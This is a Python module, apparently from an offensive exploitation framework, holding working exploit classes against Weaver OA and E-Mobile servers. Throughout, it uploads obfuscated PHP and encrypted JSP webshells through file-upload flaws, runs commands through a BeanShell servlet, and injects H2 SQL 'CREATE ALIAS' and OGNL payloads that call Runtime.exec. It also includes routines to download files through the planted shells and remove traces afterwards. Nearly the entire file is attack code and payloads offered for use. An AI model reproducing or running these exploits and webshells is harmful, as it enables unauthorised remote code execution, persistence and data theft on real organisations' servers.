import base64
import re
from urllib.parse import quote
from core.exploit import *
from core.utils import *
from core.payload import *


webshell = 'PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKixqYXZheC5jcnlwdG8uKixqYXZheC5jcnlwdG8uc3BlYy4qIiU+CjwlISBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewoJCVUoQ2xhc3NMb2FkZXIgYykgewoJCQlzdXBlcihjKTsKCQl9CgkJcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKCQkJcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKCQl9Cn0lPgo8JQp0cnl7CgkJU3RyaW5nIGtleT0iOTAwYmM4ODVkNzU1MzM3NSI7CgkJcmVxdWVzdC5zZXRBdHRyaWJ1dGUoInNreSIsIGtleSk7CgkJU3RyaW5nIGRhdGE9cmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpOwoJCWlmIChkYXRhIT0gbnVsbCkgewoJCQlTdHJpbmcgdmVyID0gU3lzdGVtLmdldFByb3BlcnR5KCJqYXZhLnZlcnNpb24iKTsKCQkJYnl0ZVtdIGNvZGU9bnVsbDsKCSAgICAgICAgaWYgKHZlci5jb21wYXJlVG8oIjEuOCIpID49IDApIHsKCSAgICAgICAgICAgIENsYXNzIEJhc2U2NCA9IENsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTsKCSAgICAgICAgICAgIE9iamVjdCBEZWNvZGVyID0gQmFzZTY0LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIsIChDbGFzc1tdKSBudWxsKS5pbnZva2UoQmFzZTY0LCAoT2JqZWN0W10pIG51bGwpOwoJICAgICAgICAgICAgY29kZSA9IChieXRlW10pIERlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIG5ldyBDbGFzc1tde2J5dGVbXS5jbGFzc30pLmludm9rZShEZWNvZGVyLCBuZXcgT2JqZWN0W117ZGF0YS5nZXRCeXRlcygiVVRGLTgiKX0pOwoJICAgICAgICB9IGVsc2UgewoJICAgICAgICAgICAgQ2xhc3MgQmFzZTY0ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwoJICAgICAgICAgICAgT2JqZWN0IERlY29kZXIgPSBCYXNlNjQubmV3SW5zdGFuY2UoKTsKCSAgICAgICAgICAgIGNvZGUgPSAoYnl0ZVtdKSBEZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9KS5pbnZva2UoRGVjb2RlciwgbmV3IE9iamVjdFtde2RhdGF9KTsKCSAgICAgICAgfQoJCQlDaXBoZXIgYyA9IENpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7CgkJCWMuaW5pdCgyLCBuZXcgU2VjcmV0S2V5U3BlYyhrZXkuZ2V0Qnl0ZXMoKSwgIkFFUyIpKTsKCQkJbmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKGNvZGUpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CgkJfQoJfWNhdGNoKEV4Y2VwdGlvbiBlKXt9OwpvdXQ9cGFnZUNvbnRleHQucHVzaEJvZHkoKTsKJT4='

def xorencode(data, key):
    result = ""
    for i in range(len(data)):
        result += chr(0xff & (ord(data[i]) ^ ord(key[i +1 & (len(key)-1)])))
    return result

def randdelim(data, count=8):
    '''Randomly split strings using commas'''
    indexs = []
    for i in range(count):
        index = random.randint(5, len(data))
        indexs.append(index)
    indexs.sort()
    
    i = 0
    result = "'" + data[:indexs[i]] + "', '"
    while i < len(indexs)-1:
        j = i
        i += 1
        result += data[indexs[j]:indexs[i]]
        result += "', '"
    result += data[indexs[i]:] + "'"
    return result

phpinfo = "<?php phpinfo();?>"

# phpshell = '''<?php
# session_start();
# @set_time_limit(0);
# @error_reporting(0);
# function E($D,$K){
#     for($i=0;$i<strlen($D);$i++) {
#         $D[$i] = $D[$i]^$K[$i+1&15];
#     }
#     return $D;
# }
# function Q($D){
#     return base64_encode($D);
# }
# function O($D){
#     return base64_decode($D);
# }
# $P='abc';
# $T='fc3ff98e8c6a0d30';
# if (isset($_POST[$P])){
#     $F=O(E(O($_POST[$P]),$T));
#     if ($F=='del') {
#         unlink(__FILE__);
#         die();
#     }
#     class C{public function nvoke($p) {eval($p."");}}
#     $R=new C();
#     $R->nvoke($F);
# }'''

phpshell = '<?php function wmQsO($maAO){ $maAO=gzinflate(base64_decode($maAO)); for($i=0;$i<strlen($maAO);$i++) {$maAO[$i] = chr(ord($maAO[$i])-1); } return $maAO; }eval(wmQsO("dZBva8IwEMY/QD9FkGNN0I2Kmzi6joF/YDioc74TF2p7HcGaSpK6F+JnN6nd1je7F8nl8nue444QG55GrUUpuTaJMpSF3otGw43YIy/EXhgauBoqVSqu8FAqI+RXXcwrmRorJVMKkx7M2clzjnmpKIgoCEE8aaMKlPab2Ve3y8gVcQGTNYgNiZrkE+b26vZv+g+bsIbO9anQVEpaKPTOfx3fneWpDWwTjcN7jjItM6wbtvn4Pz7DNg+LyE+2qR96sIr8PB3k+eMIR+kwCbJBYMsiJ1RouyAKfBF/rNaw2LDGGGZRTKc0bn/1YMXYdRwntUjkZ1j47UVUshByRzmfvb5NOW9wF5lAytrLSItEazI+HaptIVLyO548ljs7xMHa4jEpbHbX6bDwfFXBMpL4TcY/XrC8fW4UMzf2BQ=="));?>'

class WeaVerEMobile(Exploit):
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "null",
        "Content-Type": "multipart/form-data; boundary=----3fe460f51f9b7b767fbb897fb2c4d0eb",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,en;q=0.8,en;q=0.7",
        "Connection": "close"
    }

    def __init__(self, url):
        self.url = url
        self.client = HttpClient(url)
        self.shell_uri = ""

    def upload(self, linux=False):
        uri = "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
        data = '------3fe460f51f9b7b767fbb897fb2c4d0eb\r\n'
        if not linux:
            data += 'Content-Disposition: form-data; name="upload_quwan"; filename="uploadSave.php."\r\n'
        else:
            data += 'Content-Disposition: form-data; name="upload_quwan"; filename="uploadSave.php@"\r\n'
        data += (
            'Content-Type: image/jpeg\r\n'
            '\r\n'
            f'{phpshell}\r\n'
            '------3fe460f51f9b7b767fbb897fb2c4d0eb\r\n'
            'Content-Disposition: form-data; name="file"; filename=""\r\n'
            'Content-Type: application/octet-stream\r\n'
            '\r\n'
            '\r\n'
            '------3fe460f51f9b7b767fbb897fb2c4d0eb--'
        )
        response = self.client.request("POST", uri, headers=self.headers, data=data)
        if response.status_code == 200 and response.content:
            try:
                text = response.text.strip()
                text = text.split(",")
                if len(text) == 4 and text[2].strip().isdigit():
                    self.shell_uri = "/attachment/" + text[2].strip() + "/uploadSave.php"
                    self.log("File uploaded successfully", "info")
                    return ExploitStatus.SUCCESS
            except Exception as e:
                self.log("Failed to get shell path", "error")
                return ExploitStatus.FAILED
        self.log("File upload failed", "error")
        return ExploitStatus.FAILED
    
    def encode(self, data):
        data = base64.b64encode(data.encode()).decode()
        data = xorencode(data, 'fc3ff98e8c6a0d30')
        data = base64.b64encode(data.encode()).decode()
        return data
    
    def decode(self, data):
        data1 = base64.b64decode(data).decode()
        data2 = xorencode(data1, 'fc3ff98e8c6a0d30')
        data3 = base64.b64decode(data2)
        return data3
        
    def getfile(self, dirpath):
        dirpath = dirpath.replace("\\", "/")
        cmd = '''function AqL($VUCqdh){ 
$VUCqdh=gzinflate(base64_decode($VUCqdh));
 for($i=0;$i<strlen($VUCqdh);$i++)
{ $VUCqdh[$i] = chr(ord($VUCqdh[$i])-1); } return $VUCqdh;}eval(AqL("dVLLbsIwEPwAvsJFVh0LlIJoEa2bG/TCCYkbpVHqrBtLkYOSoB4g3961E4KphA8b73p2Zh9RRyNrXRhSQpLGqS4DioafBgSPVsGDrq7RLmxPCfWxNML5jbNUFqYGU5OIDIftA80Sk+aAkeIApqcRxL3+ZjqHgCrtEFbfIdocXwvL6FARYSEj5zPx/JB5UHtsHdocQfTRpr/RQ1JnqGbrCNkTCx2R8KX6ji2U/+PumwxR+gNT37AChwzZp2HiLtjKxD9Qx12s6vjvZ9zyNd6kZV5U4M+qhbUr6TnEoBmoy3ZXq4Aux3TdtaMKTNbRRFD9XtVlDgafOXqjESfXjulyR/XejstdvugaP6Pp4/Rl72/+Iry8kdxsLOfJR3wnFcyfYzCySMEpYgLdbiOm5Eyp1wUs5DyZpLMJdg4yKywJlo7W+z1TzscEszgXfw=="));'''
        cmd = f'$dd="{dirpath}";' + cmd
        data = { "abc": f'{self.encode(cmd)}' }
        response = self.client.request("POST", self.shell_uri, data=data, stream=True)
        if response.status_code == 200:
            data = b""
            for content in response.iter_content(1024*8):
                data += content
            self.log("Download file success", "info")
            return self.decode(data).replace(b'\\n', b'\r\n')
        self.log("Download file failed", "error")
        return b'error'
    
    def attack(self, cmd):
        # cmd = f'passthru("{cmd}");'
        # cmd = f'\u0070\u0061\u0073\u0073\u0074\u0068\u0072\u0075("{cmd}");'
        cmd = base64.b64encode(cmd.encode()).decode()
        cmd = f'$dd="{cmd}";'
        cmd += 'function inzzM($fvS){ $fvS=gzinflate(base64_decode($fvS)); for($i=0;$i<strlen($fvS);$i++) {$fvS[$i] = chr(ord($fvS[$i])-1); } return $fvS; }eval(inzzM("K0wqKSnNLC7TTE4qSTM3TUhNSylITdNUTU3V0rIBAA=="));'
        data = { "abc": f"{self.encode(cmd)}" }
        response = self.client.request("POST", self.shell_uri, data=data)
        if response.status_code == 200:
            self.log("The command was executed successfully", "info")
            return response.content
        
        if response.status_code == 404:
            if self.upload(linux=True) == ExploitStatus.SUCCESS:
                response = self.client.request("POST", self.shell_uri, data=data)
                if response.status_code == 200:
                    self.log("The command was executed successfully", "info")
                    return response.content

        self.log("Command execution failed", "error")
        return b"error"

    def clean(self):
        data = { "abc": f"{self.encode('del')}" }
        self.client.request("POST", self.shell_uri, data=data)

class WeaVer(Exploit):

    payload_wrapper = JspPayload()
    def __init__(self, url):
        self.url    = url
        self.client = HttpClient(url)
        self.shell_uri = ""
        self.shell  = "sh"

    def upload(self):
        shell_uris = [
            "/weaver/bsh.servlet.BshServlet",
            "/weaveroa/bsh.servlet.BshServlet",
            "/oa/bsh.servlet.BshServlet"
        ]

        # use exploit 1
        for shell_uri in shell_uris:
            self.shell_uri = shell_uri
            response = self.client.request("GET", self.shell_uri)
            if response.status_code == 200:
                self.log("BeanShell page exists, possibly vulnerable", "info")
                return ExploitStatus.SUCCESS
        
        # use exploit 2
        uri = "/page/exportImport/uploadOperation.jsp"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9,en-GB;q=0.8",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            "Connection": "close"
        }

        data = (
            '------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n'
            'Content-Disposition: form-data; name="file"; filename="infox.jsp"\r\n'
            'Content-Type: application/octet-stream\r\n'
            '\r\n'
            f'{base64.b64decode(webshell).decode()}\r\n'
            '------WebKitFormBoundary7MA4YWxkTrZu0gW--'
        )
        
        response = self.client.request("POST", uri, headers=headers, data=data)

        if response.status_code == 200:
            self.shell_uri = "/page/exportImport/fileTransfer/infox.jsp"
            self.log("File uploaded successfully", "info")
            return ExploitStatus.SUCCESS
        
        # use exploit 3
        uri = "/workrelate/plan/util/uploaderOperate.jsp"
        data = (
            '------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n'
            'Content-Disposition: form-data;name="secId"\r\n'
            '\r\n'
            '1\r\n'
            '------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n'
            'Content-Disposition: form-data; name="file"; filename="infox.jsp"\r\n'
            'Content-Type: application/octet-stream\r\n'
            '\r\n'
            f'{base64.b64decode(webshell).decode()}\r\n'
            '\r\n'
            '------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n'
            'Content-Disposition: form-data; name="plandetailid"\r\n'
            '\r\n'
            '1\r\n'
            '------WebKitFormBoundary7MA4YWxkTrZu0gW--'
        )
        
        response = self.client.request("POST", uri, headers=headers, data=data)
        if response.status_code == 200:
            pattern = re.compile(rb"fileid=\d+")
            result = re.search(pattern, response.content)
            if result:
                fileid = result.group().decode().split("=")[1]
                uri = "/OfficeServer"
                data = (
                    '------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n'
                    'Content-Disposition: form-data; name="aaa"\r\n'
                    '\r\n'
                    "{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'{fileid}'}\r\n"
                    '------WebKitFormBoundary7MA4YWxkTrZu0gW--'
                ).format(fileid=fileid)
                response = self.client.request("POST", uri, headers=headers, data=data)
                if response.status_code == 200:
                    self.log("File uploaded successfully", "info")
                    self.shell_uri = "/infox.jsp"
                    return ExploitStatus.SUCCESS
                
        self.log("Vulnerability Exploitation Failure", "error")
        return ExploitStatus.FAILED

    def attack(self, cmd):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
            "Content-Type": "application/x-www-form-urlencoded"
        }

        if len(self.shell_uri) == 0:
            return b'error'
        
        if "BshServlet" in self.shell_uri:
            # bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
            data = r'bsh.script=\u0065\u0078\u0065\u0063'
            data += quote('("sh -c {}")'.format(cmd.replace('\\', '\\\\')), 'utf-8')
            data += ';&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
            response = self.client.request("POST", self.shell_uri, headers=headers, data=data)
            if response.status_code == 200:
                self.log("Successful attack", "info")
                pattern = re.compile(rb'<pre>(.*?)</pre>', re.S)
                result = re.search(pattern, response.content)
                return result[0].replace(rb'<pre>', b'').replace(rb'</pre>', b'')
            else:
                self.log("Failed attack", "error")
                return b'error'
            
        if "infox.jsp" in self.shell_uri:
            payload = self.payload_wrapper.generate(cmd, bin=self.shell)
            result = self.client.request("POST", self.shell_uri, data=payload)
            if result.status_code == 1000:
                self.log("Failed attack", "error")
            elif result.status_code == 200:
                self.log("Successful attack", "info")
                try:
                    data = base64.b64decode(result.content)
                    return AesDecrypt(b'sky', data)
                except:
                    self.log("Failed to decrypt received data", "error")
            return b'error'
        
    def clean(self):
        pass

class WeaVerEMobile6601(Exploit):
    shell1 = "void e(String cmd) throws java.io.IOException {java.lang.Runtime rt = java.lang.Runtime.getRuntime();rt.exec(cmd);}"
    shell2 = 'void e(String cmd) throws java.lang.Exception {Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);java.lang.reflect.Field _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response"); _responseF.setAccessible(true);Object response = _responseF.get(currentRequest);java.lang.reflect.Method getWriterM = response.getClass().getMethod("getWriter");java.io.Writer writer = (java.io.Writer)getWriterM.invoke(response);java.util.Scanner s = (new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");writer.write(s.hasNext() ? s.next() : "");}'

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,en;q=0.8,en;q=0.7",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache"
    }
    def __init__(self, url):
        self.url = url
        self.client = HttpClient(url)
        self.shell_uri = "/client.do"
    
    def upload(self):
        data = "method=getupload&uploadID=1';CREATE ALIAS {xname} AS CONCAT({code});CALL {xname}('{cmd}'); select+'1".format(xname='cx0kofogx', code=randdelim(self.shell2, 30), cmd='echo OK=0')
        result = self.client.request("POST", self.shell_uri, headers=self.headers, data=data)
        if result.status_code == 200 and 'OK=0' in result.text:
            self.log("Successful upload", "info")
            return ExploitStatus.SUCCESS
        self.log("Failed to upload", "error")
        return ExploitStatus.FAILED
    
    def attack(self, cmd):
        data = "method=getupload&uploadID=1';CREATE ALIAS {xname} AS CONCAT({code});CALL {xname}('{cmd}'); select+'1".format(xname='cx0kofogy', code=randdelim(self.shell2, 30), cmd=cmd)
        result = self.client.request("POST", self.shell_uri, headers=self.headers, data=data)
        if result.status_code == 200:
            self.log("Execute Command Successful", "info")
            return result.content
        self.log("Execute Command Failed", "error")
        return b"error"
    
    def clean(self):
        data = "method=getupload&uploadID=1';DROP ALIAS {xname}; select+'1".format(xname='cx0kofogy')
        result = self.client.request("POST", self.shell_uri, headers=self.headers, data=data)
        data = "method=getupload&uploadID=1';DROP ALIAS {xname}; select+'1".format(xname='cx0kofogx')
        result = self.client.request("POST", self.shell_uri, headers=self.headers, data=data)
        if result.status_code == 200:
            self.log("Successful clean", "info")

class WeaVerEMobile6602(Exploit):
    shell1 = "void e(String cmd) throws java.io.IOException {java.lang.Runtime rt = java.lang.Runtime.getRuntime();rt.exec(cmd);}"
    shell2 = 'void e(String cmd) throws java.lang.Exception {Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);java.lang.reflect.Field _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response"); _responseF.setAccessible(true);Object response = _responseF.get(currentRequest);java.lang.reflect.Method getWriterM = response.getClass().getMethod("getWriter");java.io.Writer writer = (java.io.Writer)getWriterM.invoke(response);java.util.Scanner s = (new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");writer.write(s.hasNext() ? s.next() : "");}'

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,en;q=0.8,en;q=0.7",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache"
    }
    def __init__(self, url):
        self.url = url
        self.client = HttpClient(url)
        self.shell_uri = "/messageType.do"
    
    def upload(self):
        data = "method=create&typeName=1';CREATE ALIAS {xname} AS CONCAT({code});CALL {xname}('{cmd}'); select+'1".format(xname='cx0kofogx', code=randdelim(self.shell2, 35), cmd='echo OK=0')
        result = self.client.request("POST", self.shell_uri, headers=self.headers, data=data)
        if result.status_code == 200 and 'OK=0' in result.text:
            self.log("Successful upload", "info")
            return ExploitStatus.SUCCESS
        self.log("Failed to upload", "error")
        return ExploitStatus.FAILED
    
    def attack(self, cmd):
        data = "method=create&typeName=1';CREATE ALIAS {xname} AS CONCAT({code});CALL {xname}('{cmd}'); select+'1".format(xname='cx0kofogy', code=randdelim(self.shell2, 35), cmd=cmd)
        result = self.client.request("POST", self.shell_uri, headers=self.headers, data=data)
        if result.status_code == 200:
            self.log("Execute Command Successful", "info")
            return result.content
        self.log("Execute Command Failed", "error")
        return b"error"
    
    def clean(self):
        data = "method=create&typeName=1';DROP ALIAS {xname}; select+'1".format(xname='cx0kofogy')
        result = self.client.request("POST", self.shell_uri, headers=self.headers, data=data)
        data = "method=create&typeName=1';DROP ALIAS {xname}; select+'1".format(xname='cx0kofogx')
        result = self.client.request("POST", self.shell_uri, headers=self.headers, data=data)
        if result.status_code == 200:
            self.log("Successful clean", "info")

class WeaVerEMobileExpression(Exploit):
    def __init__(self, url):
        self.url = url
        self.client = HttpClient(url)
        self.uris = ["/login.do", "/login/login.do", "/manager/login.do"]
        self.shell_uri = ""

    def upload(self):
        data = 'message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd="{cmd}"'.format(cmd="echo OK=0")
        for uri in self.uris:
            result = self.client.request("POST", uri, data=data)
            if result.status_code == 200 and "OK=0" in result.text:
                self.log("Upload success", "info")
                self.shell_uri = uri
                return ExploitStatus.SUCCESS
        self.log("Upload failed", "error")
        return ExploitStatus.FAILED
    
    def attack(self, cmd):
        data = 'message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd="{cmd}"'.format(cmd=cmd)
        result = self.client.request("POST", self.shell_uri, data=data)
        if result.status_code == 200:
            self.log("Executed command success", "info")
            return result.content
        self.log("Command execution failed", "error")
        return b"error"

    def clean(self):
        pass

    